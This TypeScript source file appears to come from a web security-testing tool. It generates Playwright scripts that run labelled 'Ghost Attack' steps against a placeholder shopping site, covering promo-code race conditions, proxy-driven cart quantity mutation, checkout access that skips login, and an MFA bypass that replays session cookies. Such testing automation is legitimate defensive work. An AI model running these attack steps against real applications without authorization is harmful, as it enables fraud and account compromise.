import type { WorkflowSchema, AttackHypothesis } from './types';

export function generatePlaywrightScript(schema: WorkflowSchema, hypotheses: AttackHypothesis[]): string {
    const steps = schema.nodes.map((n) => {
        const type = n.label.toLowerCase();
        if (type.includes('login') || type.includes('sign in')) {
            return `  // Step: ${n.label}
  await page.goto('http://target-app.com/login');
  await page.fill('#email', 'test@architect.io');
  await page.fill('#password', 'TestPass123!');
  await page.click('#login-btn');
  await page.waitForURL('**/dashboard**');
  console.log('[✓] Login completed');`;
        }
        if (type.includes('cart') || type.includes('add')) {
            return `  // Step: ${n.label}
  await page.click('[data-id="product-001"] .add-to-cart');
  await page.waitForSelector('.cart-count');
  console.log('[✓] Item added to cart');`;
        }
        if (type.includes('promo') || type.includes('coupon') || type.includes('apply')) {
            return `  // Step: ${n.label} [ATTACK: Race Condition Test]
  const promises = Array(5).fill(null).map(() =>
    page.request.post('/api/apply-promo', { data: { code: 'SAVE50' } })
  );
  const results = await Promise.all(promises);
  console.log('[!] Race condition test: ' + results.filter(r => r.ok()).length + '/5 requests succeeded');`;
        }
        if (type.includes('quantity') || type.includes('set')) {
            return `  // Step: ${n.label} [ATTACK: Quantity Mutation via Proxy]
  await page.fill('#quantity', '1');
  // NOTE: C++ Proxy Surgeon intercepts this and mutates quantity to 9999 or -1
  await page.click('#update-cart');
  console.log('[!] Mutation injected by C++ Proxy Surgeon');`;
        }
        if (type.includes('checkout') || type.includes('pay')) {
            return `  // Step: ${n.label} [ATTACK: Direct Endpoint Access Bypass Test]
  await page.goto('http://target-app.com/checkout'); // Skip login check
  const response = await page.request.post('/api/checkout', {
    data: { items: [{ id: 'prod-001', quantity: 1 }] }
  });
  console.log('[!] Checkout bypass response: ' + response.status());`;
        }
        if (type.includes('mfa') || type.includes('otp') || type.includes('verify')) {
            return `  // Step: ${n.label} [ATTACK: MFA Bypass Attempt]
  // Attempt to navigate past MFA using replayed session cookie
  await page.goto('http://target-app.com/dashboard');
  const cookies = await page.context().cookies();
  console.log('[!] Session cookies captured: ' + JSON.stringify(cookies.map(c => c.name)));`;
        }
        if (type.includes('confirm') || type.includes('success') || type.includes('complete')) {
            return `  // Step: ${n.label}
  const confirmation = await page.textContent('.confirmation-id');
  console.log('[✓] Confirmation received: ' + confirmation);`;
        }
        return `  // Step: ${n.label}
  await page.waitForTimeout(500);
  console.log('[→] Navigating through: ${n.label}');`;
    });

    const hypothesisComments = hypotheses
        .slice(0, 3)
        .map((h) => `  // HYPOTHESIS [${h.severity}]: ${h.title}`)
        .join('\n');

    return `// ============================================================
// PROJECT ARCHITECT — Auto-Generated Ghost Attack Script
// Template: ${schema.template}
// Generated: ${new Date().toISOString()}
// Proxy: http://localhost:8080 (C++ Surgeon Engine)
// ============================================================

import { chromium } from 'playwright';

// Attack Hypotheses Being Tested:
${hypothesisComments}

async function runGhostAttack() {
  const browser = await chromium.launch({
    headless: true, // Headless saves ~1.5GB RAM on 8GB systems
    proxy: { server: 'http://localhost:8080' }, // Route through C++ Surgeon
  });

  const context = await browser.newContext({
    userAgent: 'Mozilla/5.0 (Architect-Ghost-Bot/3.0)',
    extraHTTPHeaders: { 'X-Architect-Attack': 'active' },
  });

  const page = await context.newPage();

  // Intercept network responses
  page.on('response', async (res) => {
    if (res.status() >= 400) {
      console.log(\`[SERVER ERROR] \${res.status()} → \${res.url()}\`);
    }
  });

  console.log('[ARCHITECT] Ghost Attack sequence initiated...');
  console.log('[PROXY] Routing through C++ Surgeon at localhost:8080');
  console.log('');

  try {
${steps.join('\n\n')}

    console.log('');
    console.log('[ARCHITECT] Ghost Attack sequence complete.');
    console.log('[REPORT] Review C++ proxy logs for intercepted mutations.');
  } catch (error) {
    console.error('[ERROR] Attack sequence failed:', error);
  } finally {
    await browser.close();
  }
}

runGhostAttack();
`;
}
